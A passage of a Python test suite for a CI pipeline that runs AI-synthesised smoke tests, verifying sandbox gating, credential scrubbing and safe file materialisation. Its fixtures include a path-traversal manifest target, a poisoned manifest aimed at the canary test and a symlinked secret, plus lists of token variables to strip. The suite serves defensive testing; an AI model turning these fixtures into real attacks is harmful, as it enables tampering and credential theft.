		assert result.returncode == 0, result.stdout + result.stderr

		manifest = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth" / "synth_round_1_manifest.json"
		payload = json.loads(manifest.read_text(encoding="utf-8"))
		markers = {
			"src/module.py:2:cleared": "BEHAVIOURAL_SMOKE_PRESENT_PASSED",
			"src/module.py:3:present": "BEHAVIOURAL_SMOKE_PRESENT_FAILED",
			"src/module.py:4:unknown": "BEHAVIOURAL_SMOKE_PRESENT_INCONCLUSIVE",
		}
		body_echoes = ("# cleared", "# still-present", "# inconclusive")
		wrapper_env = {key: value for key, value in os.environ.items() if key != "BEHAVIOURAL_SMOKE_SANDBOXED"}
		for row in payload["files"]:
			wrapper_path = workspace / row["cache_relpath"]
			wrapper_text = wrapper_path.read_text(encoding="utf-8")
			assert 'if [ "${BEHAVIOURAL_SMOKE_SANDBOXED:-}" != "1" ]; then' in wrapper_text
			assert wrapper_text.index("BEHAVIOURAL_SMOKE_SANDBOXED") < wrapper_text.index("_synth_output_file=")
			assert wrapper_text.index('if [ -n "${_synth_sandbox_detail}" ]; then') < wrapper_text.index("_synth_output_file=")
			assert '[ "${_synth_iface##*/}" != "lo" ]' in wrapper_text
			# Finding smoke-synth-credentialed-test-exec: outside the validation
			# driver's sandbox the model-written body is reported, never run.
			unsandboxed = subprocess.run(
				["bash", str(wrapper_path)],
				cwd=workspace,
				env=wrapper_env,
				capture_output=True,
				text=True,
				timeout=60,
			)
			assert unsandboxed.returncode == 0, unsandboxed.stdout + unsandboxed.stderr
			assert "reason=not_sandboxed" in unsandboxed.stdout
			assert "ok 1 - behavioural smoke" in unsandboxed.stdout
			assert not any(echo in unsandboxed.stdout for echo in body_echoes)
			assert "BEHAVIOURAL_SMOKE_PRESENT_PASSED" not in unsandboxed.stdout
			assert "BEHAVIOURAL_SMOKE_PRESENT_FAILED" not in unsandboxed.stdout

			assert "detail=env" in unsandboxed.stdout

			# The env flag alone is not enough: a host run fails the mount-path
			# check and the body still does not run.
			flag_only = subprocess.run(
				["bash", str(wrapper_path)],
				cwd=workspace,
				env={**wrapper_env, "BEHAVIOURAL_SMOKE_SANDBOXED": "1"},
				capture_output=True,
				text=True,
				timeout=60,
			)
			assert flag_only.returncode == 0, flag_only.stdout + flag_only.stderr
			assert "reason=not_sandboxed detail=path" in flag_only.stdout
			assert not any(echo in flag_only.stdout for echo in body_echoes)

			# Simulate the sandbox's mount path and loopback-only network by
			# neutralising only those two checks in a test copy.
			gate_path_check = 'elif [ "${BASH_SOURCE[0]:-}" != "/synth/test.sh" ]; then'
			gate_net_dir_check = "elif [ ! -d /sys/class/net ]; then"
			gate_net_loop = "for _synth_iface in /sys/class/net/*; do"
			for needle in (gate_path_check, gate_net_dir_check, gate_net_loop):
				assert needle in wrapper_text
			simulated = workspace / f"simulated_{wrapper_path.name}"
			simulated.write_text(
				wrapper_text.replace(gate_path_check, "elif false; then")
				.replace(gate_net_dir_check, "elif false; then")
				.replace(gate_net_loop, "for _synth_iface in; do"),
				encoding="utf-8",
			)

			with_credential = subprocess.run(
				["bash", str(simulated)],
				cwd=workspace,
				env={**wrapper_env, "BEHAVIOURAL_SMOKE_SANDBOXED": "1", "GH_TOKEN": "fake-token"},
				capture_output=True,
				text=True,
				timeout=60,
			)
			assert with_credential.returncode == 0, with_credential.stdout + with_credential.stderr
			assert "reason=not_sandboxed detail=credentials" in with_credential.stdout
			assert not any(echo in with_credential.stdout for echo in body_echoes)

			sandbox_env = {
				key: value
				for key, value in wrapper_env.items()
				if key not in {
					"GH_TOKEN", "GITHUB_TOKEN", "GH_PAT", "OPENROUTER_API_KEY", "TG_BOT_SECRET",
					"CHECK_TRIAGE_ISSUES_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
					"ACTIONS_ID_TOKEN_REQUEST_URL", "ACTIONS_RUNTIME_TOKEN",
					"CLAUDE_CODE_OAUTH_TOKEN", "ANTHROPIC_API_KEY",
				}
			}
			wrapper_result = subprocess.run(
				["bash", str(simulated)],
				cwd=workspace,
				env={**sandbox_env, "BEHAVIOURAL_SMOKE_SANDBOXED": "1"},
				capture_output=True,
				text=True,
				timeout=60,
			)
			assert wrapper_result.returncode == 0, wrapper_result.stdout + wrapper_result.stderr
			assert markers[row["issue_id"]] in wrapper_result.stdout
			assert "reason=not_sandboxed" not in wrapper_result.stdout
			assert "ok 1 - behavioural smoke" in wrapper_result.stdout


def test_review_autofix_workflow_wires_behavioural_smoke_after_interim_judge() -> None:
	workflow = REVIEW_AUTOFIX_WORKFLOW.read_text(encoding="utf-8")
	stage_helper = STAGE_HELPER.read_text(encoding="utf-8")
	validate_workflow = VALIDATE_WORKFLOW.read_text(encoding="utf-8")
	assert "BEHAVIOURAL_SMOKE_FROM_JUDGE_ENABLED: ${{ vars.BEHAVIOURAL_SMOKE_FROM_JUDGE_ENABLED || 'false' }}" in workflow
	assert "BEHAVIOURAL_SMOKE_LANG: ${{ vars.BEHAVIOURAL_SMOKE_LANG || '' }}" in workflow
	assert "BEHAVIOURAL_SMOKE_MODEL: ${{ vars.BEHAVIOURAL_SMOKE_MODEL || 'openai/gpt-6-luna' }}" in workflow
	assert "BEHAVIOURAL_SMOKE_TIMEOUT_S: ${{ vars.BEHAVIOURAL_SMOKE_TIMEOUT_S || '120' }}" in workflow
	assert "VALIDATION_INCLUDE_SYNTHESISED: ${{ vars.VALIDATION_INCLUDE_SYNTHESISED || 'true' }}" in workflow
	assert "VALIDATION_INCLUDE_SYNTHESISED: ${{ vars.VALIDATION_INCLUDE_SYNTHESISED || 'true' }}" in validate_workflow
	bootstrap_line = next(
		(line for line in stage_helper.splitlines() if "REQUIRED_BOOTSTRAP_SCRIPTS=" in line),
		"",
	)
	assert "review_synthesise_smoke.sh" in bootstrap_line
	assert "prompts/behavioural-smoke-synthesise.txt" in stage_helper
	judge_idx = workflow.find("- name: Run interim judge")
	synth_idx = workflow.find("- name: Synthesize behavioural smoke")
	ledger_idx = workflow.find("- name: Save review-issue ledger")
	assert judge_idx != -1, "review_autofix.yml missing the Run interim judge step"
	assert synth_idx != -1, "review_autofix.yml missing the behavioural smoke synthesis step"
	assert ledger_idx != -1, "review_autofix.yml missing the Save review-issue ledger step"
	assert judge_idx < synth_idx < ledger_idx, (
		"Behavioural smoke synthesis must run after interim judge and before the review-runtime cache save."
	)
	step_block = workflow[synth_idx : synth_idx + 600]
	assert "env.BEHAVIOURAL_SMOKE_FROM_JUDGE_ENABLED == 'true'" in step_block
	assert "env.JUDGE_INTERIM_ENABLED == 'true'" in step_block
	assert 'timeout --signal=TERM --kill-after=30s -- "${BEHAVIOURAL_SMOKE_TIMEOUT_S}"' in SYNTH_SCRIPT.read_text(encoding="utf-8")
	assert '--model "${BEHAVIOURAL_SMOKE_MODEL}"' in SYNTH_SCRIPT.read_text(encoding="utf-8")
	# OpenCode runs only inside the review sandbox, never on the host.
	assert 'opencode_run_cmd' not in SYNTH_SCRIPT.read_text(encoding="utf-8")
	assert 'behavioural_smoke_sandbox_attempt codex' in SYNTH_SCRIPT.read_text(encoding="utf-8")
	assert 'command -v codex' not in SYNTH_SCRIPT.read_text(encoding="utf-8")


def test_review_synthesise_smoke_is_registered_in_ci_workflows() -> None:
	for workflow_path in (CI_WORKFLOW, MARK_STABLE_WORKFLOW, TEST_AND_MARK_STABLE_WORKFLOW):
		workflow = workflow_path.read_text(encoding="utf-8")
		assert "PYTHONDONTWRITEBYTECODE=1 python3 tests/test_review_synthesise_smoke.py" in workflow, workflow_path


def test_validate_workflows_restore_cached_behavioural_smoke_artifacts() -> None:
	validate_workflow = VALIDATE_WORKFLOW.read_text(encoding="utf-8")
	internal_validate_workflow = INTERNAL_VALIDATE_WORKFLOW.read_text(encoding="utf-8")
	review_workflow = REVIEW_AUTOFIX_WORKFLOW.read_text(encoding="utf-8")

	assert "description: \"Review PR number for restoring cached behavioural smoke artifacts (0 to auto-detect from tracking issue)\"" in validate_workflow
	assert "- name: Normalize behavioural smoke include flag" in validate_workflow
	assert "id: behavioural_smoke_gate" in validate_workflow
	assert "- name: Resolve behavioural smoke source PR" in validate_workflow
	assert "if: steps.behavioural_smoke_gate.outputs.enabled == 'true'" in validate_workflow
	assert "- name: Restore behavioural smoke runtime cache" in validate_workflow
	assert ".ai/review_runtime/" in validate_workflow
	assert "review-ledger-${{ github.repository }}-pr-${{ steps.behavioural_smoke_pr.outputs.pr_number }}-" in validate_workflow

	assert "pr_number:" in internal_validate_workflow
	assert "pr_number: ${{ inputs.pr_number || '0' }}" in internal_validate_workflow

	dispatch_idx = review_workflow.find("Dispatching standalone validation for linked issue")
	assert dispatch_idx != -1, "review_autofix.yml missing standalone validation dispatch"
	dispatch_block = review_workflow[dispatch_idx : dispatch_idx + 500]
	assert '-f tracking_issue="0"' in dispatch_block
	assert '-f pr_number="${PR_NUMBER}"' in dispatch_block


def test_validate_driver_can_exclude_synthesised_smoke_files() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_driver_synth_gate_") as td:
		test_dir = Path(td) / "validation" / "tests"
		test_dir.mkdir(parents=True, exist_ok=True)
		for name in ("00_canary.sh", "10_regular.sh", "synth_round_1_issue.sh", "_helpers.sh"):
			path = test_dir / name
			path.write_text("#!/usr/bin/env bash\nexit 0\n", encoding="utf-8")
			path.chmod(0o755)

		function_text = _extract_shell_function(VALIDATE_DRIVER, "discover_tests")
		base_script = (
			"set -euo pipefail\n"
			f"TEST_DIR={test_dir}\n"
			"COMPOSE_LOG=/dev/null\n"
			"CANARY_PATTERN=*canary*.sh\n"
			"CANARY_REQUIRED=0\n"
			"HELPER_PATTERN=_*.sh\n"
			"TEST_FILES=()\n"
			"CANARY_TEST=''\n"
			"fail_fast() { echo \"FAIL:$1:$2\" >&2; exit 99; }\n"
		)

		include_true = subprocess.run(
			[
				"bash",
				"-c",
				base_script
				+ "VALIDATION_INCLUDE_SYNTHESISED=true\n"
				+ function_text
				+ "discover_tests\nprintf '%s\\n' \"${TEST_FILES[@]}\"\n",
			],
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)
		include_false = subprocess.run(
			[
				"bash",
				"-c",
				base_script
				+ "VALIDATION_INCLUDE_SYNTHESISED=false\n"
				+ function_text
				+ "discover_tests\nprintf '%s\\n' \"${TEST_FILES[@]}\"\n",
			],
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)

		included_paths = include_true.stdout.splitlines()
		excluded_paths = include_false.stdout.splitlines()
		assert str(test_dir / "10_regular.sh") in included_paths
		assert str(test_dir / "10_regular.sh") in excluded_paths
		assert str(test_dir / "synth_round_1_issue.sh") in included_paths
		assert str(test_dir / "synth_round_1_issue.sh") not in excluded_paths
		assert str(test_dir / "_helpers.sh") not in included_paths
		assert "excluded 1 synthesised behavioural smoke script(s)" in include_false.stderr


def test_validate_process_materializes_latest_cached_synthesised_smoke_tests() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_materialize_") as td:
		workspace = Path(td)

		round1_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-1" / "synth"
		round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
		round1_dir.mkdir(parents=True, exist_ok=True)
		round3_dir.mkdir(parents=True, exist_ok=True)

		old_wrapper = round1_dir / "synth_round_1_old_issue.sh"
		old_wrapper.write_text("#!/usr/bin/env bash\necho old\n", encoding="utf-8")
		old_wrapper.chmod(0o755)
		(round1_dir / "synth_round_1_manifest.json").write_text(
			json.dumps(
				{
					"round": 1,
					"head_sha": "oldsha",
					"language": "python",
					"source_artifact": ".ai/review_runtime/pr-4242/round-1/judge_interim.json",
					"target_manifest_relpath": "validation/tests/synth_round_1_manifest.json",
					"files": [
						{
							"issue_id": "old",
							"file": "src/module.py",
							"line_start": 1,
							"line_end": 1,
							"severity": "must-fix",
							"slug": "old_issue",
							"cache_relpath": ".ai/review_runtime/pr-4242/round-1/synth/synth_round_1_old_issue.sh",
							"target_relpath": "validation/tests/synth_round_1_old_issue.sh",
							"suggested_path": "validation/tests/synth_round_1_old_issue.sh",
							"expected_to_fail_until_fixed": True,
						}
					],
				},
				indent=2,
			)
			+ "\n",
			encoding="utf-8",
		)

		latest_wrapper = round3_dir / "synth_round_3_latest_issue.sh"
		latest_wrapper.write_text("#!/usr/bin/env bash\necho latest\n", encoding="utf-8")
		latest_wrapper.chmod(0o755)
		(round3_dir / "synth_round_3_manifest.json").write_text(
			json.dumps(
				{
					"round": 3,
					"head_sha": "newsha",
					"language": "python",
					"source_artifact": ".ai/review_runtime/pr-4242/round-3/judge_interim.json",
					"target_manifest_relpath": "validation/tests/synth_round_3_manifest.json",
					"files": [
						{
							"issue_id": "latest",
							"file": "src/module.py",
							"line_start": 3,
							"line_end": 3,
							"severity": "must-fix",
							"slug": "latest_issue",
							"cache_relpath": ".ai/review_runtime/pr-4242/round-3/synth/synth_round_3_latest_issue.sh",
							"target_relpath": "validation/tests/synth_round_3_latest_issue.sh",
							"suggested_path": "validation/tests/synth_round_3_latest_issue.sh",
							"expected_to_fail_until_fixed": True,
						}
					],
				},
				indent=2,
			)
			+ "\n",
			encoding="utf-8",
		)

		function_text = _extract_shell_function(VALIDATE_PROCESS, "materialize_synthesised_behavioural_smoke_tests")

		disabled = subprocess.run(
			[
				"bash",
				"-c",
				"set -euo pipefail\n"
				+ "VALIDATION_INCLUDE_SYNTHESISED=false\n"
				+ function_text
				+ "materialize_synthesised_behavioural_smoke_tests\n",
			],
			cwd=workspace,
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)
		assert "skipping synthesised behavioural smoke materialization" in disabled.stderr
		assert not (workspace / "validation" / "tests" / "synth_round_3_latest_issue.sh").exists()

		enabled = subprocess.run(
			[
				"bash",
				"-c",
				"set -euo pipefail\n"
				+ "VALIDATION_INCLUDE_SYNTHESISED=true\n"
				+ function_text
				+ "materialize_synthesised_behavioural_smoke_tests\n",
			],
			cwd=workspace,
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)

		latest_target = workspace / "validation" / "tests" / "synth_round_3_latest_issue.sh"
		latest_manifest = workspace / "validation" / "tests" / "synth_round_3_manifest.json"
		old_target = workspace / "validation" / "tests" / "synth_round_1_old_issue.sh"

		assert "Materialized synthesised behavioural smoke tests" in enabled.stdout
		assert latest_target.exists()
		assert latest_target.read_text(encoding="utf-8") == latest_wrapper.read_text(encoding="utf-8")
		assert os.access(latest_target, os.X_OK)
		assert latest_manifest.exists()
		assert json.loads(latest_manifest.read_text(encoding="utf-8"))["round"] == 3
		assert not old_target.exists()


def test_validate_process_skips_wrapper_copy_when_manifest_target_is_invalid() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_manifest_invalid_") as td:
		workspace = Path(td)

		round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
		round3_dir.mkdir(parents=True, exist_ok=True)
		latest_wrapper = round3_dir / "synth_round_3_latest_issue.sh"
		latest_wrapper.write_text("#!/usr/bin/env bash\necho latest\n", encoding="utf-8")
		latest_wrapper.chmod(0o755)
		(round3_dir / "synth_round_3_manifest.json").write_text(
			json.dumps(
				{
					"round": 3,
					"head_sha": "newsha",
					"language": "python",
					"source_artifact": ".ai/review_runtime/pr-4242/round-3/judge_interim.json",
					"target_manifest_relpath": "../outside.json",
					"files": [
						{
							"issue_id": "latest",
							"file": "src/module.py",
							"line_start": 3,
							"line_end": 3,
							"severity": "must-fix",
							"slug": "latest_issue",
							"cache_relpath": ".ai/review_runtime/pr-4242/round-3/synth/synth_round_3_latest_issue.sh",
							"target_relpath": "validation/tests/synth_round_3_latest_issue.sh",
							"suggested_path": "validation/tests/synth_round_3_latest_issue.sh",
							"expected_to_fail_until_fixed": True,
						}
					],
				},
				indent=2,
			)
			+ "\n",
			encoding="utf-8",
		)

		function_text = _extract_shell_function(VALIDATE_PROCESS, "materialize_synthesised_behavioural_smoke_tests")
		result = subprocess.run(
			[
				"bash",
				"-c",
				"set -euo pipefail\n"
				+ "VALIDATION_INCLUDE_SYNTHESISED=true\n"
				+ function_text
				+ "materialize_synthesised_behavioural_smoke_tests\n",
			],
			cwd=workspace,
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)

		latest_target = workspace / "validation" / "tests" / "synth_round_3_latest_issue.sh"
		assert not latest_target.exists()
		assert not (workspace / "outside.json").exists()
		assert "skipping synthesised smoke materialization because target_manifest_relpath is invalid" in result.stderr
		assert "Materialized synthesised behavioural smoke tests" not in result.stdout


def _run_materializer(workspace: Path) -> subprocess.CompletedProcess[str]:
	function_text = _extract_shell_function(VALIDATE_PROCESS, "materialize_synthesised_behavioural_smoke_tests")
	return subprocess.run(
		[
			"bash",
			"-c",
			"set -euo pipefail\n"
			+ "VALIDATION_INCLUDE_SYNTHESISED=true\n"
			+ function_text
			+ "materialize_synthesised_behavioural_smoke_tests\n",
		],
		cwd=workspace,
		capture_output=True,
		text=True,
		check=True,
		timeout=60,
	)


def _manifest_row(cache_name: str, target_relpath: str) -> dict:
	return {
		"issue_id": cache_name,
		"file": "src/module.py",
		"line_start": 3,
		"line_end": 3,
		"severity": "must-fix",
		"slug": "latest_issue",
		"cache_relpath": f".ai/review_runtime/pr-4242/round-3/synth/{cache_name}",
		"target_relpath": target_relpath,
		"suggested_path": target_relpath,
		"expected_to_fail_until_fixed": True,
	}


def test_validate_process_rejects_non_synth_target_names_and_symlinked_sources() -> None:
	# Finding smoke-synth-credentialed-test-exec: a cache-poisoned manifest
	# must not plant a host-run test (or overwrite the canary) under a name
	# the driver's sandbox routing would miss, nor copy a symlinked secret.
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_names_") as td:
		workspace = Path(td)
		round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
		round3_dir.mkdir(parents=True, exist_ok=True)
		for name in ("synth_round_3_good_issue.sh", "synth_round_3_canary_issue.sh"):
			(round3_dir / name).write_text("#!/usr/bin/env bash\necho hi\n", encoding="utf-8")
		secret = workspace / "secret.txt"
		secret.write_text("TOKEN\n", encoding="utf-8")
		(round3_dir / "synth_round_3_link_issue.sh").symlink_to(secret)
		(round3_dir / "synth_round_3_manifest.json").write_text(
			json.dumps(
				{
					"round": 3,
					"head_sha": "newsha",
					"target_manifest_relpath": "validation/tests/synth_round_3_manifest.json",
					"files": [
						_manifest_row("synth_round_3_good_issue.sh", "validation/tests/synth_round_3_good_issue.sh"),
						_manifest_row("synth_round_3_canary_issue.sh", "validation/tests/00_canary.sh"),
						_manifest_row("synth_round_3_link_issue.sh", "validation/tests/synth_round_3_link_issue.sh"),
					],
				}
			)
			+ "\n",
			encoding="utf-8",
		)

		result = _run_materializer(workspace)

		tests_dir = workspace / "validation" / "tests"
		assert (tests_dir / "synth_round_3_good_issue.sh").is_file()
		assert not (tests_dir / "00_canary.sh").exists()
		assert not (tests_dir / "synth_round_3_link_issue.sh").exists()
		assert "not named synth_round_<n>_<slug>.sh: validation/tests/00_canary.sh" in result.stderr
		assert "source that is a symlink" in result.stderr
		assert "files=1" in result.stdout


def test_validate_process_rejects_non_synth_manifest_target_name() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_manifest_name_") as td:
		workspace = Path(td)
		round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
		round3_dir.mkdir(parents=True, exist_ok=True)
		(round3_dir / "synth_round_3_good_issue.sh").write_text("#!/usr/bin/env bash\n", encoding="utf-8")
		(round3_dir / "synth_round_3_manifest.json").write_text(
			json.dumps(
				{
					"round": 3,
					"target_manifest_relpath": "validation/tests/00_canary.sh",
					"files": [_manifest_row("synth_round_3_good_issue.sh", "validation/tests/synth_round_3_good_issue.sh")],
				}
			)
			+ "\n",
			encoding="utf-8",
		)

		result = _run_materializer(workspace)

		assert not (workspace / "validation" / "tests" / "00_canary.sh").exists()
		assert not (workspace / "validation" / "tests" / "synth_round_3_good_issue.sh").exists()
		assert "target_manifest_relpath is invalid" in result.stderr


def test_validate_process_launches_harness_without_pipeline_credentials() -> None:
	script = VALIDATE_PROCESS.read_text(encoding="utf-8")
	scrub = script.split("VALIDATION_HARNESS_CREDENTIAL_SCRUB=(", 1)[1].split(")", 1)[0].split()
	assert scrub[0] == "env"
	for name in (
		"GH_TOKEN",
		"GITHUB_TOKEN",
		"GH_PAT",
		"OPENROUTER_API_KEY",
		"TG_BOT_SECRET",
		"CHECK_TRIAGE_ISSUES_TOKEN",
		"ACTIONS_ID_TOKEN_REQUEST_TOKEN",
		"ACTIONS_ID_TOKEN_REQUEST_URL",
		"ACTIONS_RUNTIME_TOKEN",
		"CLAUDE_CODE_OAUTH_TOKEN",
		"ANTHROPIC_API_KEY",
		"BEHAVIOURAL_SMOKE_SANDBOXED",
	):
		assert f"-u {name}" in " ".join(scrub)
	assert "validation_harness_scrub_append\n" in script
	launch_lines = [line.strip() for line in script.splitlines() if '> "${VALIDATION_LOG_FILE}" 2>&1 &' in line]
	assert len(launch_lines) == 3
	for line in launch_lines:
		assert line.startswith('"${VALIDATION_HARNESS_CREDENTIAL_SCRUB[@]}" ')


def _write_round3_manifest(workspace: Path, rows: list, target_manifest: str = "validation/tests/synth_round_3_manifest.json") -> Path:
	round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
	round3_dir.mkdir(parents=True, exist_ok=True)
	(round3_dir / "synth_round_3_manifest.json").write_text(
		json.dumps({"round": 3, "head_sha": "newsha", "target_manifest_relpath": target_manifest, "files": rows}) + "\n",
		encoding="utf-8",
	)
	return round3_dir


def test_validate_process_materializer_never_overwrites_or_follows_targets() -> None:
	# Finding smoke-manifest-canary-overwrite: a restored manifest may only
	# create new synth_round_<round>_<slug>.sh files for its own round; it
	# never follows a symlink, overwrites a different file or repeats a name.
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_no_overwrite_") as td:
		workspace = Path(td)
		round3_dir = _write_round3_manifest(
			workspace,
			[
				_manifest_row("synth_round_3_good_issue.sh", "validation/tests/synth_round_3_good_issue.sh"),
				_manifest_row("synth_round_3_good_issue.sh", "validation/tests/synth_round_3_good_issue.sh"),
				_manifest_row("synth_round_3_other_round.sh", "validation/tests/synth_round_2_other_round.sh"),
				_manifest_row("synth_round_3_link_target.sh", "validation/tests/synth_round_3_link_target.sh"),
				_manifest_row("synth_round_3_existing.sh", "validation/tests/synth_round_3_existing.sh"),
				_manifest_row("synth_round_3_identical.sh", "validation/tests/synth_round_3_identical.sh"),
			],
		)
		body = "#!/usr/bin/env bash\necho cached\n"
		for name in (
			"synth_round_3_good_issue.sh",
			"synth_round_3_other_round.sh",
			"synth_round_3_link_target.sh",
			"synth_round_3_existing.sh",
			"synth_round_3_identical.sh",
		):
			(round3_dir / name).write_text(body, encoding="utf-8")
		tests_dir = workspace / "validation" / "tests"
		tests_dir.mkdir(parents=True, exist_ok=True)
		canary = tests_dir / "00_canary.sh"
		canary.write_text("#!/usr/bin/env bash\necho canary\n", encoding="utf-8")
		(tests_dir / "synth_round_3_link_target.sh").symlink_to(canary)
		(tests_dir / "synth_round_3_existing.sh").write_text("#!/usr/bin/env bash\necho project\n", encoding="utf-8")
		(tests_dir / "synth_round_3_identical.sh").write_text(body, encoding="utf-8")

		result = _run_materializer(workspace)

		assert canary.read_text(encoding="utf-8") == "#!/usr/bin/env bash\necho canary\n"
		assert (tests_dir / "synth_round_3_existing.sh").read_text(encoding="utf-8") == "#!/usr/bin/env bash\necho project\n"
		assert (tests_dir / "synth_round_3_good_issue.sh").read_text(encoding="utf-8") == body
		assert os.access(tests_dir / "synth_round_3_good_issue.sh", os.X_OK)
		assert not (tests_dir / "synth_round_2_other_round.sh").exists()
		assert "duplicate synthesised smoke target" in result.stderr
		assert "round does not match the manifest" in result.stderr
		assert "(target_not_regular)" in result.stderr
		assert "(target_exists)" in result.stderr
		# good + identical (already materialized) count; nothing else does.
		assert "files=2" in result.stdout, result.stdout + result.stderr
		assert (tests_dir / "synth_round_3_manifest.json").is_file()

		# A second run (self-heal re-exec) is idempotent.
		rerun = _run_materializer(workspace)
		assert "files=2" in rerun.stdout, rerun.stdout + rerun.stderr
		assert "synthesised smoke manifest not copied" not in rerun.stderr


def test_validate_process_rejects_manifest_copy_under_another_round_name() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_manifest_round_") as td:
		workspace = Path(td)
		round3_dir = _write_round3_manifest(
			workspace,
			[_manifest_row("synth_round_3_good_issue.sh", "validation/tests/synth_round_3_good_issue.sh")],
			target_manifest="validation/tests/synth_round_1_manifest.json",
		)
		(round3_dir / "synth_round_3_good_issue.sh").write_text("#!/usr/bin/env bash\n", encoding="utf-8")

		result = _run_materializer(workspace)

		assert not (workspace / "validation" / "tests" / "synth_round_1_manifest.json").exists()
		assert not (workspace / "validation" / "tests" / "synth_round_3_good_issue.sh").exists()
		assert "target_manifest_relpath is invalid" in result.stderr


def test_validate_process_fallback_runner_skips_synthesised_tests() -> None:
	# Finding smoke-synth-fallback-driver-host-exec: the generated fallback
	# runner has no sandbox, so it must report synth_round_*.sh as skipped
	# before it would run any test with bash.
	with tempfile.TemporaryDirectory(prefix="validate_process_fallback_runner_") as td:
		runner = Path(td) / "runner.sh"
		function_text = _extract_shell_function(VALIDATE_PROCESS, "ensure_runtime_validation_driver")
		subprocess.run(
			["bash", "-c", function_text + "ensure_runtime_validation_driver\n"],
			env={**os.environ, "VALIDATION_RUNNER_FILE": str(runner)},
			check=True,
			capture_output=True,
			text=True,
			timeout=60,
		)
		text = runner.read_text(encoding="utf-8")
		subprocess.run(["bash", "-n", str(runner)], check=True)
		assert "unset BEHAVIOURAL_SMOKE_SANDBOXED" in text
		skip_index = text.index('if [[ "${test_name}" == synth_round_*.sh ]]; then')
		assert skip_index < text.index('bash "${test_script}"')
		assert "BEHAVIOURAL_SMOKE_SANDBOX test=${test_name} outcome=skipped reason=fallback_driver" in text
		assert "# SKIP behavioural smoke sandbox unavailable" in text


def test_validate_process_scrub_drops_credential_shaped_variables() -> None:
	# Finding validation-harness-credential-inheritance: the harness launch
	# drops every credential-shaped variable, not only a fixed list.
	script = VALIDATE_PROCESS.read_text(encoding="utf-8")
	start = script.index("VALIDATION_HARNESS_CREDENTIAL_SCRUB=(")
	end = script.index("validation_harness_scrub_append\n", script.index("validation_harness_scrub_append()")) + len(
		"validation_harness_scrub_append\n"
	)
	block = script[start:end]
	env = {
		"PATH": os.environ.get("PATH", "/usr/bin:/bin"),
		"HOME": "/tmp",
		"DOCKER_HOST": "unix:///var/run/docker.sock",
		"COMPOSE_PROJECT_NAME": "validation",
		"VALIDATION_TEST_API_KEY": "fixture-key",
		"TEST_API_KEY": "fixture-key",
		"FOO_TOKEN": "secret-1",
		"MY_SERVICE_SECRET": "secret-2",
		"DEPLOY_PRIVATE_KEY": "secret-3",
		"SOME_API_KEY": "secret-4",
		"GH_REPO": "owner/repo",
		"GH_TOKEN": "secret-5",
		"ACTIONS_RUNTIME_TOKEN": "secret-6",
		"ANTHROPIC_API_KEY": "secret-7",
		"BEHAVIOURAL_SMOKE_SANDBOXED": "1",
	}
	result = subprocess.run(
		["bash", "-c", block + '"${VALIDATION_HARNESS_CREDENTIAL_SCRUB[@]}" env\n'],
		env=env,
		capture_output=True,
		text=True,
		check=True,
		timeout=60,
	)
	names = {line.split("=", 1)[0] for line in result.stdout.splitlines() if "=" in line}
	for kept in ("PATH", "HOME", "DOCKER_HOST", "COMPOSE_PROJECT_NAME", "VALIDATION_TEST_API_KEY", "TEST_API_KEY"):
		assert kept in names, kept
	for dropped in (
		"FOO_TOKEN", "MY_SERVICE_SECRET", "DEPLOY_PRIVATE_KEY", "SOME_API_KEY", "GH_REPO",
		"GH_TOKEN", "ACTIONS_RUNTIME_TOKEN", "ANTHROPIC_API_KEY", "BEHAVIOURAL_SMOKE_SANDBOXED",
	):
		assert dropped not in names, dropped
	assert "secret-" not in result.stdout


def test_validate_process_warns_when_synth_sources_are_missing() -> None:
	with tempfile.TemporaryDirectory(prefix="validate_process_synth_missing_") as td:
		workspace = Path(td)

		round3_dir = workspace / ".ai" / "review_runtime" / "pr-4242" / "round-3" / "synth"
		round3_dir.mkdir(parents=True, exist_ok=True)
		(round3_dir / "synth_round_3_manifest.json").write_text(
			json.dumps(
				{
					"round": 3,
					"head_sha": "newsha",
					"language": "python",
					"source_artifact": ".ai/review_runtime/pr-4242/round-3/judge_interim.json",
					"target_manifest_relpath": "validation/tests/synth_round_3_manifest.json",
					"files": [
						{
							"issue_id": "latest",
							"file": "src/module.py",
							"line_start": 3,
							"line_end": 3,
							"severity": "must-fix",
							"slug": "latest_issue",
							"cache_relpath": ".ai/review_runtime/pr-4242/round-3/synth/missing_wrapper.sh",
							"target_relpath": "validation/tests/synth_round_3_latest_issue.sh",
							"suggested_path": "validation/tests/synth_round_3_latest_issue.sh",
							"expected_to_fail_until_fixed": True,
						}
					],
				},
				indent=2,
			)
			+ "\n",
			encoding="utf-8",
		)

		function_text = _extract_shell_function(VALIDATE_PROCESS, "materialize_synthesised_behavioural_smoke_tests")
		result = subprocess.run(
			[
				"bash",
				"-c",
				"set -euo pipefail\n"
				+ "VALIDATION_INCLUDE_SYNTHESISED=true\n"
				+ function_text
				+ "materialize_synthesised_behavioural_smoke_tests\n",
			],
			cwd=workspace,
			capture_output=True,
			text=True,
			check=True,
			timeout=60,
		)

		manifest_target = workspace / "validation" / "tests" / "synth_round_3_manifest.json"
		assert manifest_target.exists()
		assert "missing synthesised smoke source" in result.stderr
		assert "listed 1 file(s) but none were materialized into validation/tests" in result.stderr
		assert "Materialized synthesised behavioural smoke tests" not in result.stdout


def main() -> int:
	test_funcs = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
	passed = 0
